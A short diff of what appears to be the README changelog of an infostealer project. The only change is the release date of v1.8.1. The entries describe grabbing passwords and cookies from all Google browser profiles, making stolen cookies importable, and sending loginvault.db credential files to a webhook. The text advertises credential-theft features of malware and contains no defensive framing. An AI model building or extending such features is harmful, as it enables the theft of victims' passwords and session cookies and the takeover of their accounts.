@@ -120,7 +120,7 @@ config = {
 ## <a id="changelog"></a>💭 〢 ChangeLog
 
 ```diff
-v1.8.1 ⋮ 2022-06-13
+v1.8.1 ⋮ 2022-06-14
 + now grabs passwords and cookies from all google profiles (default, guest profile, profile 1, profile 2, etc...)
 + cookie format is now correct and can be imported (thank you ilylunar)
 + fixed uncommon bug were the loginvault.db files got sent to the webhook
